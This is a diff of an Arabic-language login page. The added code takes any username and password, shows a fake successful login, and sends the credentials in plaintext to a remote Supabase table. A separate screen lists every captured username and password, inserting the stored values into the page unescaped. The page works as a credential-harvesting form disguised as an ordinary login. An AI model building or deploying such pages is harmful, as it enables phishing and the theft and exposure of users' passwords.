@@ -1,28 +1,129 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تسجيل الدخول</title>
-<link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام تسجيل الدخول والبيانات</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+        body { background-color: #121214; color: #ededed; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .card { background-color: #1e1e24; padding: 40px 30px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5); width: 100%; max-width: 450px; text-align: center; border: 1px solid #2a2a32; }
+        .card-large { max-width: 600px; }
+        h2, h1 { margin-bottom: 8px; color: #fff; }
+        p.subtitle { color: #9ca3af; font-size: 14px; margin-bottom: 24px; }
+        .input-group { margin-bottom: 16px; text-align: right; }
+        label { display: block; margin-bottom: 6px; font-size: 14px; color: #cbd5e1; }
+        input { width: 100%; padding: 12px 16px; background-color: #141416; border: 1px solid #3f3f46; border-radius: 6px; color: #fff; font-size: 16px; }
+        input:focus { outline: none; border-color: #3ecf8e; }
+        button { width: 100%; padding: 12px; background-color: #3ecf8e; border: none; color: #121214; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 12px; }
+        button:hover { background-color: #30b175; }
+        .btn-secondary { background-color: #3f3f46; color: #fff; }
+        .table-container { max-height: 300px; overflow-y: auto; margin-top: 20px; border: 1px solid #3f3f46; border-radius: 6px; }
+        table { width: 100%; border-collapse: collapse; text-align: right; }
+        th, td { padding: 12px; border-bottom: 1px solid #2a2a32; font-size: 14px; }
+        th { background-color: #141416; color: #3ecf8e; }
+        .hidden { display: none !important; }
+    </style>
 </head>
-
 <body>
 
-<div class="login-box">
-<h2>تسجيل الدخول</h2>
+    <!-- الواجهة الأولى -->
+    <div id="loginSection" class="card">
+        <h2>مرحباً بك مجدداً</h2>
+        <p class="subtitle">الرجاء إدخال بياناتك للمتابعة</p>
+        <form id="authForm">
+            <div class="input-group">
+                <label>اسم المستخدم</label>
+                <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            </div>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
 
-<input type="text" id="username" placeholder="اسم المستخدم">
+    <!-- الواجهة الثانية -->
+    <div id="welcomeSection" class="card hidden">
+        <h1 style="color: #3ecf8e;">تم الدخول بنجاح!</h1>
+        <p class="subtitle">تم الانتقال وحفظ البيانات.</p>
+        <button onclick="showDataPage()">عرض البيانات المحفوظة (الصفحة الثالثة)</button>
+        <button onclick="triggerLogout()" class="btn-secondary">خروج</button>
+    </div>
 
-<input type="password" id="password" placeholder="كلمة المرور">
+    <!-- الواجهة الثالثة -->
+    <div id="dataSection" class="card card-large hidden">
+        <h1 style="color: #3ecf8e;">قائمة البيانات المسجلة</h1>
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>اسم المستخدم</th>
+                        <th>كلمة المرور</th>
+                    </tr>
+                </thead>
+                <tbody id="dataTableBody"></tbody>
+            </table>
+        </div>
+        <button onclick="goBackToWelcome()" class="btn-secondary" style="margin-top: 20px;">العودة</button>
+    </div>
 
-<button onclick="login()">دخول</button>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script>
+        const SUPABASE_URL = 'https://ehxprrdxcmmakrtvqoec.supabase.co';
+        const SUPABASE_ANON_KEY = 'ضع_مفتاح_anon_key_هنا'; 
 
-<p id="message"></p>
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-</div>
+        document.getElementById('authForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const userVal = document.getElementById("username").value;
+            const passVal = document.getElementById("password").value;
 
-<script src="script.js"></script>
+            document.getElementById('loginSection').classList.add('hidden');
+            document.getElementById('welcomeSection').classList.remove('hidden');
 
+            try {
+                // إرسال بحروف صغيرة لتوافق التعديل الجديد في قاعدة بياناتك
+                await supabaseClient
+                    .from('0ex1err')
+                    .insert([{ username: userVal, password: passVal }]);
+            } catch (err) {
+                console.error(err);
+            }
+        });
+
+        async function showDataPage() {
+            document.getElementById('welcomeSection').classList.add('hidden');
+            document.getElementById('dataSection').classList.remove('hidden');
+            const tbody = document.getElementById('dataTableBody');
+            tbody.innerHTML = "<tr><td colspan='2' style='text-align:center;'>جاري التحميل...</td></tr>";
+
+            try {
+                const { data, error } = await supabaseClient
+                    .from('0ex1err')
+                    .select('username, password'); 
+
+                if (error) throw error;
+                tbody.innerHTML = "";
+
+                if (data && data.length > 0) {
+                    data.forEach(row => {
+                        const tr = document.createElement('tr');
+                        tr.innerHTML = `<td>${row.username || 'فارغ'}</td><td>${row.password || 'فارغ'}</td>`;
+                        tbody.appendChild(tr);
+                    });
+                } else {
+                    tbody.innerHTML = "<tr><td colspan='2' style='text-align:center;'>الجدول فارغ حالياً.</td></tr>";
+                }
+            } catch (err) {
+                tbody.innerHTML = "<tr><td colspan='2' style='text-align:center; color: red;'>فشل جلب البيانات. تأكد من تجربة التصفح الخفي لتجاوز الكاش.</td></tr>";
+            }
+        }
+
+        function goBackToWelcome() { document.getElementById('dataSection').classList.add('hidden'); document.getElementById('welcomeSection').classList.remove('hidden'); }
+        function triggerLogout() { document.getElementById('welcomeSection').classList.add('hidden'); document.getElementById('loginSection').classList.remove('hidden'); document.getElementById('authForm').reset(); }
+    </script>
 </body>
 </html>
